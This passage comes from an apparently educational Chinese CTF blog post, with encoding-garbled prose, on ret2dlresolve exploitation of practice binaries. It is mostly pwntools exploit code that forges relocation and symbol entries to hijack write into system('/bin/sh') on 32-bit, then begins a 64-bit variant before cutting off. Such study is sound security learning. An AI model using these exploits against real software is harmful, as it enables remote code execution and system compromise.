class="string">&#x27;Input:&#x27;</span>,payload)</span><br></pre></td></tr></table></figure><p>æ¥ä¸‹æ¥æˆ‘ä»¬ä¹Ÿå€Ÿç”¨CTF Wikiçš„æ¸è¿›æ€è·¯æ¥ä¸€æ­¥æ­¥æ·±å…¥çš„å­¦ä¹ è¿™ä¸ªéƒ¨åˆ†</p><h4 id="é˜¶æ®µä¸€"><a href="#é˜¶æ®µä¸€" class="headerlink" title="é˜¶æ®µä¸€"></a>é˜¶æ®µä¸€</h4><p>æˆ‘ä»¬å…ˆåšç®€å•çš„ä¸€æ­¥ï¼Œæ‰‹åŠ¨è°ƒç”¨plt[0]ï¼Œæ¥è§£æwriteå‡½æ•°ï¼Œå°†æˆ‘ä»¬çš„å‘½ä»¤æ‰“å°å‡ºæ¥å³å¯ã€‚æˆ‘ä»¬éœ€è¦æå‰å°†write_reloc_ageç»™pushè¿›æ ˆï¼Œä¹Ÿå°±æ˜¯æˆ‘ä»¬åªè¦åœ¨æ ˆé‡Œå­˜æ”¾ç€writeçš„write_reloc_ageå³å¯ã€‚è¿™é‡Œå¯»æ‰¾writeçš„reloc_ageä¹Ÿå’Œä¹‹å‰æ‰¾plt[0]çš„æ–¹æ³•ä¸€æ ·ã€‚</p><p><img src="https://kr0emer-blog-1306550410.cos.ap-nanjing.myqcloud.com/img/image-20210820151957887.png" alt="å¯»æ‰¾writeçš„reloc_age"></p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">write_reloc_age=<span class="number">0x10</span></span><br><span class="line">cmd=<span class="string">&#x27;/bin/sh\x00&#x27;</span></span><br><span class="line"></span><br><span class="line">payload =p32(<span class="number">0</span>)</span><br><span class="line">payload+=p32(plt_0)</span><br><span class="line">payload+=p32(write_reloc_age)</span><br><span class="line">payload+=p32(main_addr)<span class="comment">#è¿”å›åœ°å€</span></span><br><span class="line">payload+=p32(<span class="number">1</span>)</span><br><span class="line">payload+=p32(fake_stack+<span class="built_in">len</span>(payload)+<span class="number">8</span>)</span><br><span class="line">payload+=p32(<span class="built_in">len</span>(cmd))</span><br><span class="line">payload+=cmd</span><br><span class="line"></span><br><span class="line">sleep(<span class="number">0.1</span>)</span><br><span class="line">sl(io,payload)</span><br><span class="line">rv(io)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><p><img src="https://kr0emer-blog-1306550410.cos.ap-nanjing.myqcloud.com/img/image-20210820155824511.png" alt="å¾—åˆ°æˆ‘ä»¬çš„/bin/sh\x00"></p><h4 id="é˜¶æ®µäºŒ"><a href="#é˜¶æ®µäºŒ" class="headerlink" title="é˜¶æ®µäºŒ"></a>é˜¶æ®µäºŒ</h4><p>æˆ‘ä»¬è¿™æ­¥æ§åˆ¶å¥½reloc_ageçš„å¤§å°ï¼Œç„¶åä½¿å¾—relocè½åœ¨æˆ‘ä»¬å¯ä»¥æ§åˆ¶çš„.bssæ®µï¼Œè®©å…¶æŒ‡å‘æˆ‘ä»¬ä¼ªé€ çš„writeé‡å®šä½é¡¹ï¼Œè¿™æ ·å°±å¯ä»¥æ§åˆ¶é“r_info</p><p>æˆ‘ä»¬å…ˆæŸ¥çœ‹æˆ‘ä»¬æˆ‘ä»¬æ–‡ä»¶çš„é‡å®šä½è¡¨<code>readelf -r level3_partialrelro_32</code></p><p><img src="https://kr0emer-blog-1306550410.cos.ap-nanjing.myqcloud.com/img/image-20210820165349463.png" alt="æŸ¥çœ‹é‡å®šä½è¡¨"></p><p>è¿™æ ·å°±å¯ä»¥æ‰¾åˆ°æˆ‘ä»¬writeçš„r_info</p><p>å‰©ä¸‹çš„å°±æ˜¯å°†writeçš„æŒ‡é’ˆæŒ‡å‘æˆ‘ä»¬æˆ‘ä»¬å¤åˆ¶åœ¨.bssæ®µçš„é‡å®šä½é¡¹ã€‚æ›´æ”¹ä¸€ä¸‹æˆ‘ä»¬ä¹‹å‰çš„payloadå³å¯</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">fake_write_reloc_age=fake_stack+<span class="number">7</span>*<span class="number">4</span>-rel_plt_addr</span><br><span class="line">cmd=<span class="string">&#x27;/bin/sh\x00&#x27;</span></span><br><span class="line">r_info=<span class="number">0x407</span></span><br><span class="line"></span><br><span class="line">payload =p32(<span class="number">0</span>)</span><br><span class="line">payload+=p32(plt_0)</span><br><span class="line">payload+=p32(fake_write_reloc_age)</span><br><span class="line">payload+=p32(main_addr)<span class="comment">#è¿”å›åœ°å€</span></span><br><span class="line">payload+=p32(<span class="number">1</span>)</span><br><span class="line">payload+=p32(fake_stack+<span class="built_in">len</span>(payload)+<span class="number">4</span>*<span class="number">4</span>)</span><br><span class="line">payload+=p32(<span class="built_in">len</span>(cmd))</span><br><span class="line">payload+=p32(write_got)</span><br><span class="line">payload+=p32(r_info)</span><br><span class="line">payload+=cmd</span><br><span class="line"></span><br><span class="line">sleep(<span class="number">0.1</span>)</span><br><span class="line">sl(io,payload)</span><br><span class="line">rv(io)</span><br><span class="line"></span><br><span class="line">io.interactive()x00</span><br></pre></td></tr></table></figure><p>æˆåŠŸè¾“å‡ºäº†/bin/sh\x00</p><p><img src="https://kr0emer-blog-1306550410.cos.ap-nanjing.myqcloud.com/img/image-20210820171854054.png" alt="åŒæ ·å¾—åˆ°æˆ‘ä»¬çš„/bin/shã€x00"></p><h4 id="é˜¶æ®µä¸‰"><a href="#é˜¶æ®µä¸‰" class="headerlink" title="é˜¶æ®µä¸‰"></a>é˜¶æ®µä¸‰</h4><p>è¿™ä¸€é˜¶æ®µæˆ‘ä»¬æ§åˆ¶æˆ‘ä»¬ä¹‹å‰æ§åˆ¶å¥½çš„r_infoï¼Œä½¿å¾—writeçš„Elf32_Symè½åœ¨æˆ‘ä»¬çš„å¯æ§èŒƒå›´å†…</p><p>æˆ‘çŸ¥é“æˆ‘ä»¬çš„r_infoåˆ†ä¸ºä¸¤éƒ¨åˆ†ï¼Œ32ä½ä¸‹ï¼Œç¬¬å…«ä½ä¸ºé‡å®šä½å…¥å£ç±»å‹ï¼Œé«˜24ä½ä¸ºé‡å®šä½å…¥å£çš„ç¬¦å·åœ¨ç¬¦å·è¡¨çš„ä¸‹æ ‡ã€‚</p><p>æˆ‘ä»¬writeçš„r_infoæ˜¯0x407ï¼Œä¹Ÿå°±æ˜¯åç§»ä¸º4ï¼Œé‡å®šä½ç±»å‹ä¸º7</p><p>è¿™é‡Œæˆ‘ä»¬è¦å°†writeçš„Elf32_Symåˆ°æˆ‘ä»¬çš„.bssæ®µä¸Šï¼Œè€Œä¸”è¦ä¿è¯å…¶16å­—èŠ‚å¯¹é½</p><p>æˆ‘ä»¬é™¤äº†ä¿®æ”¹r_infoä¹‹å¤–è¿˜è¦å¤åˆ¶ä¸€ä»½writeçš„Elf32_Symã€‚å…ˆæŸ¥çœ‹ä¸€ä¸‹å…¶å†…å®¹ï¼Œç”±äºä¹‹å‰æˆ‘ä»¬å¾—åˆ°å…¶offsetä¸º4ï¼Œé‚£ä¹ˆæˆ‘ä»¬å¯ä»¥é€šè¿‡æŸ¥çœ‹æ•´ä¸ªsymtabå¾—åˆ°ä»–</p><p><img src="https://kr0emer-blog-1306550410.cos.ap-nanjing.myqcloud.com/img/image-20210820204830683.png" alt="è·å–writeçš„Elf32_Sym"></p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">fake_write_reloc_age=fake_stack+<span class="number">7</span>*<span class="number">4</span>-rel_plt_addr</span><br><span class="line">align=<span class="number">0x10</span>-((fake_stack+<span class="number">36</span>-dynsym_addr)%<span class="number">16</span>)<span class="comment">#è¿™é‡Œæ˜¯ä¸ºäº†ä¿è¯æˆ‘ä»¬wrteå‡½æ•°è™šå‡çš„ç¬¦å·è¡¨é¡¹åœ°å€æ˜¯16å­—èŠ‚å¯¹é½çš„ï¼Œè¿™é‡Œä¸ºåé¢åšä¸€ä¸ªè¡¥é½</span></span><br><span class="line">fake_write_Elf32_Sym_addr=fake_stack+<span class="number">36</span>+align</span><br><span class="line">fake_info=((((fake_write_Elf32_Sym_addr-dynsym_addr)//<span class="number">16</span>)&lt;&lt;<span class="number">8</span>)|<span class="number">0x7</span>)<span class="comment">#æœ€å|0x7æ˜¯ä¸ºäº†ä¿è¯é‡å®šä½ç±»å‹ä¸å˜</span></span><br><span class="line"></span><br><span class="line">fake_write_Elf32_Rel=p32(write_got)+p32(fake_info)</span><br><span class="line">fake_write_Elf32_Sym=p32(<span class="number">0x31</span>)+p32(<span class="number">0</span>)+p32(<span class="number">0</span>)+p32(<span class="number">0x12</span>)</span><br><span class="line"></span><br><span class="line">cmd=<span class="string">&#x27;/bin/sh\x00&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">payload =p32(<span class="number">0</span>)</span><br><span class="line">payload+=p32(plt_0)</span><br><span class="line">payload+=p32(fake_write_reloc_age)</span><br><span class="line">payload+=p32(main_addr)<span class="comment">#è¿”å›åœ°å€</span></span><br><span class="line">payload+=p32(<span class="number">1</span>)</span><br><span class="line">payload+=p32(fake_stack+<span class="built_in">len</span>(payload)+<span class="built_in">len</span>(fake_write_Elf32_Rel)+<span class="built_in">len</span>(fake_write_Elf32_Sym)+align+<span class="number">8</span>)</span><br><span class="line">payload+=p32(<span class="built_in">len</span>(cmd))</span><br><span class="line">payload+=fake_write_Elf32_Rel</span><br><span class="line">payload+=align*<span class="string">&#x27;a&#x27;</span></span><br><span class="line">payload+=fake_write_Elf32_Sym</span><br><span class="line">payload+=cmd</span><br><span class="line"></span><br><span class="line">sleep(<span class="number">0.1</span>)</span><br><span class="line">sl(io,payload)</span><br><span class="line">rv(io)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><h4 id="é˜¶æ®µå››"><a href="#é˜¶æ®µå››" class="headerlink" title="é˜¶æ®µå››"></a>é˜¶æ®µå››</h4><p>åœ¨ä¸Šä¸€é˜¶æ®µæˆ‘ä»¬æ§åˆ¶äº†Elf32_Symï¼Œæ¥ä¸‹æ¥å°±å¯ä»¥æ§åˆ¶å­—ç¬¦ä¸²è¡¨äº†ï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡ä¿®æ”¹st_nameæ¥å¯»æ‰¾åˆ°å­—ç¬¦ä¸²è¡¨ï¼Œå°†å…¶æ”¾ç½®åœ¨æˆ‘ä»¬çš„.bssæ®µ</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">sla(io,<span class="string">&#x27;Input:&#x27;</span>,payload)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">fake_write_reloc_age=fake_stack+<span class="number">7</span>*<span class="number">4</span>-rel_plt_addr</span><br><span class="line">align=<span class="number">0x10</span>-((fake_stack+<span class="number">36</span>-dynsym_addr)%<span class="number">16</span>)<span class="comment">#è¿™é‡Œæ˜¯ä¸ºäº†ä¿è¯æˆ‘ä»¬wrteå‡½æ•°è™šå‡çš„ç¬¦å·è¡¨é¡¹åœ°å€æ˜¯16å­—èŠ‚å¯¹é½çš„ï¼Œè¿™é‡Œä¸ºåé¢åšä¸€ä¸ªè¡¥é½</span></span><br><span class="line">fake_write_Elf32_Sym_addr=fake_stack+<span class="number">36</span>+align</span><br><span class="line">fake_info=((((fake_write_Elf32_Sym_addr-dynsym_addr)//<span class="number">16</span>)&lt;&lt;<span class="number">8</span>)|<span class="number">0x7</span>)<span class="comment">#æœ€å|0x7æ˜¯ä¸ºäº†ä¿è¯é‡å®šä½ç±»å‹ä¸å˜</span></span><br><span class="line">fake_write_str_addr=fake_stack+<span class="number">36</span>+align+<span class="number">0x10</span></span><br><span class="line">fake_st_name=fake_write_str_addr-dynstr_addr</span><br><span class="line"></span><br><span class="line">fake_write_Elf32_Rel=p32(write_got)+p32(fake_info)</span><br><span class="line">fake_write_Elf32_Sym=p32(fake_st_name)+p32(<span class="number">0</span>)+p32(<span class="number">0</span>)+p32(<span class="number">0x12</span>)</span><br><span class="line">fake_write_str=<span class="string">&#x27;write\x00&#x27;</span></span><br><span class="line">cmd=<span class="string">&#x27;/bin/sh\x00&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">payload =p32(<span class="number">0</span>)</span><br><span class="line">payload+=p32(plt_0)</span><br><span class="line">payload+=p32(fake_write_reloc_age)</span><br><span class="line">payload+=p32(main_addr)<span class="comment">#è¿”å›åœ°å€</span></span><br><span class="line">payload+=p32(<span class="number">1</span>)</span><br><span class="line">payload+=p32(fake_stack+<span class="built_in">len</span>(payload)+<span class="built_in">len</span>(fake_write_Elf32_Rel)+<span class="built_in">len</span>(fake_write_Elf32_Sym)+<span class="built_in">len</span>(fake_write_str)+align+<span class="number">8</span>)</span><br><span class="line">payload+=p32(<span class="built_in">len</span>(cmd))</span><br><span class="line">payload+=fake_write_Elf32_Rel</span><br><span class="line">payload+=align*<span class="string">&#x27;a&#x27;</span></span><br><span class="line">payload+=fake_write_Elf32_Sym</span><br><span class="line">payload+=fake_write_str</span><br><span class="line">payload+=cmd</span><br><span class="line"></span><br><span class="line">sleep(<span class="number">0.1</span>)</span><br><span class="line">sl(io,payload)</span><br><span class="line">rv(io)</span><br></pre></td></tr></table></figure><p><img src="https://kr0emer-blog-1306550410.cos.ap-nanjing.myqcloud.com/img/image-20210820211523106.png" alt="åŒæ ·æˆåŠŸ"></p><h4 id="é˜¶æ®µäº”"><a href="#é˜¶æ®µäº”" class="headerlink" title="é˜¶æ®µäº”"></a>é˜¶æ®µäº”</h4><p>æ—¢ç„¶æˆ‘ä»¬å·²ç»æ§åˆ¶äº†å­—ç¬¦ä¸²è¡¨ï¼Œå‰©ä¸‹çš„å°±æ˜¯å°†å…¶ä¿®æ”¹æ‰å³å¯ï¼Œæˆ‘ä»¬åªè¦å°†writeä¿®æ”¹ä¸ºsystemï¼Œè¿˜æœ‰å°†å…³äºåç§»å’Œå‡½æ•°è°ƒç”¨çš„å‚æ•°å…¨éƒ¨ä¿®æ”¹å³å¯å°†writeåŠ«æŒåˆ°systemä»è€Œæ‹¿å–shellã€‚</p><p>æœ€ç»ˆexp</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#coding:utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.os=<span class="string">&#x27;linux&#x27;</span></span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context.arch=<span class="string">&#x27;i386&#x27;</span></span><br><span class="line"></span><br><span class="line">io=process(<span class="string">&#x27;./level3_partialrelro_32&#x27;</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./level3_partialrelro_32&#x27;</span>)</span><br><span class="line"></span><br><span class="line">ru = <span class="keyword">lambda</span> p, x ,drop=<span class="literal">False</span>: p.recvuntil(x,drop)</span><br><span class="line">sn = <span class="keyword">lambda</span> p, x            : p.send(x)</span><br><span class="line">rl = <span class="keyword">lambda</span> p               : p.recvline()</span><br><span class="line">sl = <span class="keyword">lambda</span> p, x            : p.sendline(x)</span><br><span class="line">rv = <span class="keyword">lambda</span> p, x=<span class="number">1024</span>       : p.recv(numb = x)</span><br><span class="line">sa = <span class="keyword">lambda</span> p, a, b         : p.sendafter(a,b)</span><br><span class="line">sla = <span class="keyword">lambda</span> p, a, b        : p.sendlineafter(a,b)</span><br><span class="line">rr = <span class="keyword">lambda</span> p, t            : p.recvrepeat(t)</span><br><span class="line">rd = <span class="keyword">lambda</span> p, x            : p.recvuntil(x, drop=<span class="literal">True</span>)</span><br><span class="line"></span><br><span class="line">offset=<span class="number">112</span></span><br><span class="line">write_got=elf.got[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">read_plt=elf.plt[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">main_addr=elf.sym[<span class="string">&#x27;main&#x27;</span>]</span><br><span class="line"></span><br><span class="line">plt_0=<span class="number">0x8049030</span></span><br><span class="line">write_plt_without_push=<span class="number">0x08049060</span><span class="comment">#å’Œplt_0ç­‰ä»·</span></span><br><span class="line"></span><br><span class="line">pop_ebp_ret=<span class="number">0x080492b3</span></span><br><span class="line">pop_esi_edi_ebp_ret=<span class="number">0x080492b1</span></span><br><span class="line">leave_ret=<span class="number">0x08049125</span></span><br><span class="line">ret=<span class="number">0x0804900e</span></span><br><span class="line"></span><br><span class="line">rel_plt_addr=elf.get_section_by_name(<span class="string">&#x27;.rel.plt&#x27;</span>).header.sh_addr</span><br><span class="line">dynstr_addr=elf.get_section_by_name(<span class="string">&#x27;.dynstr&#x27;</span>).header.sh_addr</span><br><span class="line">dynsym_addr=elf.get_section_by_name(<span class="string">&#x27;.dynsym&#x27;</span>).header.sh_addr</span><br><span class="line">bss_addr=elf.get_section_by_name(<span class="string">&#x27;.bss&#x27;</span>).header.sh_addr</span><br><span class="line">fake_stack=bss_addr+<span class="number">0x800</span></span><br><span class="line"></span><br><span class="line">payload =<span class="string">b&#x27;a&#x27;</span>*offset+p32(read_plt)</span><br><span class="line">payload+=p32(pop_esi_edi_ebp_ret)</span><br><span class="line">payload+=p32(<span class="number">0</span>)+p32(fake_stack)+p32(<span class="number">0x300</span>)</span><br><span class="line">payload+=p32(pop_ebp_ret)</span><br><span class="line">payload+=p32(fake_stack)</span><br><span class="line">payload+=p32(leave_ret)</span><br><span class="line"></span><br><span class="line">sla(io,<span class="string">&#x27;Input:&#x27;</span>,payload)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">fake_write_reloc_age=fake_stack+<span class="number">5</span>*<span class="number">4</span>-rel_plt_addr</span><br><span class="line">align=<span class="number">0x10</span>-((fake_stack+<span class="number">36</span>-<span class="number">8</span>-dynsym_addr)%<span class="number">16</span>)<span class="comment">#è¿™é‡Œæ˜¯ä¸ºäº†ä¿è¯æˆ‘ä»¬wrteå‡½æ•°è™šå‡çš„ç¬¦å·è¡¨é¡¹åœ°å€æ˜¯16å­—èŠ‚å¯¹é½çš„ï¼Œè¿™é‡Œä¸ºåé¢åšä¸€ä¸ªè¡¥é½</span></span><br><span class="line">fake_write_Elf32_Sym_addr=fake_stack+<span class="number">36</span>-<span class="number">8</span>+align</span><br><span class="line">fake_info=((((fake_write_Elf32_Sym_addr-dynsym_addr)//<span class="number">16</span>)&lt;&lt;<span class="number">8</span>)|<span class="number">0x7</span>)<span class="comment">#æœ€å|0x7æ˜¯ä¸ºäº†ä¿è¯é‡å®šä½ç±»å‹ä¸å˜</span></span><br><span class="line">fake_write_str_addr=fake_stack+<span class="number">36</span>-<span class="number">8</span>+align+<span class="number">0x10</span></span><br><span class="line">fake_st_name=fake_write_str_addr-dynstr_addr</span><br><span class="line"></span><br><span class="line">fake_write_Elf32_Rel=p32(write_got)+p32(fake_info)</span><br><span class="line">fake_write_Elf32_Sym=p32(fake_st_name)+p32(<span class="number">0</span>)+p32(<span class="number">0</span>)+p32(<span class="number">0x12</span>)</span><br><span class="line">fake_write_str=<span class="string">&#x27;system\x00&#x27;</span></span><br><span class="line">cmd=<span class="string">&#x27;/bin/sh\x00&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">payload =p32(<span class="number">0</span>)</span><br><span class="line">payload+=p32(plt_0)</span><br><span class="line">payload+=p32(fake_write_reloc_age)</span><br><span class="line">payload+=p32(<span class="number">0</span>)<span class="comment">#è¿”å›åœ°å€</span></span><br><span class="line">payload+=p32(fake_stack+<span class="built_in">len</span>(payload)+<span class="built_in">len</span>(fake_write_Elf32_Rel)+<span class="built_in">len</span>(fake_write_Elf32_Sym)+<span class="built_in">len</span>(fake_write_str)+align+<span class="number">4</span>)</span><br><span class="line">payload+=fake_write_Elf32_Rel</span><br><span class="line">payload+=align*<span class="string">&#x27;a&#x27;</span></span><br><span class="line">payload+=fake_write_Elf32_Sym</span><br><span class="line">payload+=fake_write_str</span><br><span class="line">payload+=cmd</span><br><span class="line"></span><br><span class="line">sleep(<span class="number">0.1</span>)</span><br><span class="line">sl(io,payload)</span><br><span class="line">rv(io)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><h3 id="64ä½ä¸‹ä¼ªé€ reloc-ageå’Œä¼ªé€ Elf32-Relã€Elf32-Symç»“æ„ä½“è¿›è¡Œæ”»å‡»ï¼ˆPartial-RELROä¸”éœ€è¦æ³„éœ²åœ°å€ï¼‰"><a href="#64ä½ä¸‹ä¼ªé€ reloc-ageå’Œä¼ªé€ Elf32-Relã€Elf32-Symç»“æ„ä½“è¿›è¡Œæ”»å‡»ï¼ˆPartial-RELROä¸”éœ€è¦æ³„éœ²åœ°å€ï¼‰" class="headerlink" title="64ä½ä¸‹ä¼ªé€ reloc_ageå’Œä¼ªé€ Elf32_Relã€Elf32_Symç»“æ„ä½“è¿›è¡Œæ”»å‡»ï¼ˆPartial RELROä¸”éœ€è¦æ³„éœ²åœ°å€ï¼‰"></a>64ä½ä¸‹ä¼ªé€ reloc_ageå’Œä¼ªé€ Elf32_Relã€Elf32_Symç»“æ„ä½“è¿›è¡Œæ”»å‡»ï¼ˆPartial RELROä¸”éœ€è¦æ³„éœ²åœ°å€ï¼‰</h3><p>åœ¨å¼€å§‹æ”»å‡»ä¹‹å‰æˆ‘ä»¬è¦å…ˆæ¥çœ‹çœ‹64ä½ä¸‹ä¸€äº›ç»“æ„ä½“çš„å˜åŒ–</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    Elf64_Addrr_offset;</span><br><span class="line">    Elf64_Xwordr_info;</span><br><span class="line">    Elf64_Sxwordr_addend;</span><br><span class="line">&#125; Elf64_Rela;</span><br></pre></td></tr></table></figure><p>è¿™é‡Œç›¸è¾ƒäº32ä½æ¯ä¸ªæˆå‘˜çš„å¤§å°å˜ä¸ºäº†64ä½ï¼Œå³ä¸º8ä¸ªå­—èŠ‚ï¼Œå¤šäº†ä¸€ä¸ªr_addendï¼Œä¸€å…±ä¸º24ä¸ªå­—èŠ‚ã€‚Elf32_Rela ä¸­æ˜¯ç”¨r_addend æ˜¾å¼åœ°æŒ‡å‡ºåŠ æ•°;è€Œå¯¹ Elf32_Relæ¥è¯´,åŠ æ•°æ˜¯éšå«åœ¨è¢«ä¿®æ”¹çš„ä½ç½®é‡Œçš„ã€‚</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">Elf64_Wordst_name;               </span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span>st_info;               </span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span>st_info;                </span><br><span class="line">Elf64_Sectionst_shndx;                </span><br><span class="line">Elf64_Addrst_value;                </span><br><span class="line">Elf64_Xwordst_size;               </span><br><span class="line">&#125; Elf64_Sym;</span><br></pre></td></tr></table></figure><p>å…¶ä¸­st_nameä¸º32ä½ï¼Œst_infoå’Œst_infoå„8ä½ï¼Œst_shndxä¸º16ä½ï¼Œst_valueå’Œst_sizeå„64ä½ï¼Œä¸€å…±ä¸º24ä¸ªå­—èŠ‚ã€‚</p><p>æˆ‘ä»¬é€šè¿‡ä¸Šé¢çš„åˆ†æçŸ¥é“64ä½æœ‰é«˜æ¦‚ç‡ä¼šåŠ«æŒå¤±è´¥ï¼Œæ‰€ä»¥æˆ‘ä»¬éœ€è¦åšä¸€äº›é¢å¤–çš„æ“ä½œ</p><p>è¿˜æ˜¯ä¹‹å‰çš„ä»£ç </p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">  <span class="keyword">if</span> (l-&gt;l_info[VERSYMIDX (DT_VERSYM)] != <span class="literal">NULL</span>)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="function"><span class="keyword">const</span> <span class="title">ElfW</span><span class="params">(Half)</span> *vernum </span>=</span><br><span class="line">    (<span class="keyword">const</span> <span class="keyword">void</span> *) D_PTR (l, l_info[VERSYMIDX (DT_VERSYM)]);</span><br><span class="line">  ElfW(Half) ndx = vernum[ELFW(R_SYM) (reloc-&gt;r_info)] &amp; <span class="number">0x7fff</span>;</span><br><span class="line">  version = &amp;l-&gt;l_versions[ndx];</span><br><span class="line">  <span class="keyword">if</span> (version-&gt;hash == <span class="number">0</span>)</span><br><span class="line">    version = <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æˆ‘ä»¬å¯ä»¥çœ‹åˆ°å¦‚æœä¸è¿›å…¥è¿™ä¸ªåˆ¤æ–­è¯­å¥å°±ä¸ä¼šè§¦å‘ï¼Œä¹Ÿå°±æ˜¯æŠŠ l-&gt;l_info[VERSYMIDX(DT_VERSYM)] è®¾ç½®ä¸º NULLã€‚æˆ‘ä»¬çŸ¥é“<strong>gotè¡¨çš„ç¬¬é›¶é¡¹å‚¨å­˜çš„æ˜¯link_map</strong>,è¿™æ ·æˆ‘ä»¬åªéœ€è¦æ³„éœ²å¹¶ä¿®æ”¹æ‰ l-&gt;l_info[VERSYMIDX(DT_VERSYM)] å³å¯ï¼Œè€Œå…¶åç§»å¯ä»¥é€šè¿‡è°ƒè¯•å¾—åˆ°æ˜¯0x1c8</p><p>å‰©ä¸‹çš„å’Œ32å·®åˆ«ä¸å¤§ï¼Œå°±ä¸ä¸€ä¸€åˆ—ä¸¾äº†ï¼Œä¸€æ¬¡æ”¾åœ¨expä¸­</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#coding:utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.os=<span class="string">&#x27;linux&#x27;</span></span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context.arch=<span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"></span><br><span class="line">io=process(<span class="string">&#x27;./level3_partialrelro_64&#x27;</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./level3_partialrelro_64&#x27;</span>)</span><br><span class="line"></span><br><span class="line">ru = <span class="keyword">lambda</span> p, x ,drop=<span class="literal">False</span>: p.recvuntil(x,drop)</span><br><span class="line">sn = <span class="keyword">lambda</span> p, x            : p.send(x)</span><br><span class="line">rl = <span class="keyword">lambda</span> p               : p.recvline()</span><br><span class="line">sl = <span class="keyword">lambda</span> p, x            : p.sendline(x)</span><br><span class="line">rv = <span class="keyword">lambda</span> p, x=<span class="number">1024</span>       : p.recv(numb = x)</span><br><span class="line">sa = <span class="keyword">lambda</span> p, a, b         : p.sendafter(a,b)</span><br><span class="line">sla = <span class="keyword">lambda</span> p, a, b        : p.sendlineafter(a,b)</span><br><span class="line">rr = <span class="keyword">lambda</span> p, t            : p.recvrepeat(t)</span><br><span class="line">rd = <span class="keyword">lambda</span> p, x            : p.recvuntil(x, drop=<span class="literal">True</span>)</span><br><span class="line"></span><br><span class="line">offset=<span class="number">120</span></span><br><span class="line"></span><br><span class="line">write_got=elf.got[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">read_got=elf.got[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">link_map_got=<span class="number">0x404008</span></span><br><span class="line">read_plt=elf.plt[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">main_addr=elf.sym[<span class="string">&#x27;main&#x27;</span>]</span><br><span class="line">vuln_addr=<span class="number">0x401156</span></span><br><span class="line">plt_0=<span class="number">0x401020</span></span><br><span class="line"></span><br><span class="line">dynstr_addr=elf.get_section_by_name(<span class="string">&#x27;.dynstr&#x27;</span>).header.sh_addr</span><br><span class="line">dynsym_addr=elf.get_section_by_name(<span class="string">&#x27;.dynsym&#x27;</span>).header.sh_addr</span><br><span class="line">bss_addr=elf.get_section_by_name(<span class="string">&#x27;.bss&#x27;</span>).header.sh_addr</span><br><span class="line">rel_plt_addr=elf.get_section_by_name(<span class="string">&#x27;.rela.plt&#x27;</span>).header.sh_addr<span class="comment">#64ä½ä¸­.rel.pltè¢«ç§°ä½œ.rela.plt</span></span><br><span class="line">fake_stack=bss_addr+<span class="number">0x800</span></span><br><span class="line"></span><br><span class="line">gadget1=<span class="number">0x40121A</span>    <span class="comment">#pop rbx; pop rbp; pop r12; pop r13; pop r14; pop r15; retn</span></span><br><span class="line">gadget2=<span class="number">0x401200</span>    <span class="comment">#mov rdx, r14; mov rsi, r13; mov edi, r12d; call qword ptr [r15+rbx*8]</span></span><br><span class="line">pop_rdi_ret=<span class="number">0x0000000000401223</span></span><br><span class="line">pop_rsi_r15_ret=<span class="number">0x0000000000401221</span></span><br><span class="line">pop_rbp_ret=<span class="number">0x40113d</span></span><br><span class="line">ret=<span class="number">0x000000000040101a</span></span><br><span class="line">leave_ret=<span class="number">0x40118f</span></span><br><span class="line"></span><br><span class="line">payload =<span class="string">&#x27;a&#x27;</span>*offset</span><br><span class="line">payload+=p64(gadget1)</span><br><span class="line">payload+=p64(<span class="number">0</span>)<span class="comment">#rbx ä¸ºäº†åé¢è·³è½¬åšåç§»</span></span><br><span class="line">payload+=p64(<span class="number">0x1</span>)<span class="comment">#rbp,ä¸å¯ä¸º0</span></span><br><span class="line">payload+=p64(<span class="number">0x1</span>)<span class="comment">#r12 -&gt; rdi</span></span><br><span class="line">payload+=p64(link_map_got)<span class="comment">#r13 -&gt; rsi</span></span><br><span class="line">payload+=p64(<span class="number">0x8</span>)<span class="comment">#r14-&gt;rdx</span></span><br><span class="line">payload+=p64(write_got)<span class="comment">#r15</span></span><br><span class="line">payload+=p64(gadget2)<span class="comment">#ret</span></span><br><span class="line">payload+=<span class="string">&#x27;A&#x27;</span>*<span class="number">0x38</span><span class="comment">#è¿”å›åå¯¹æ 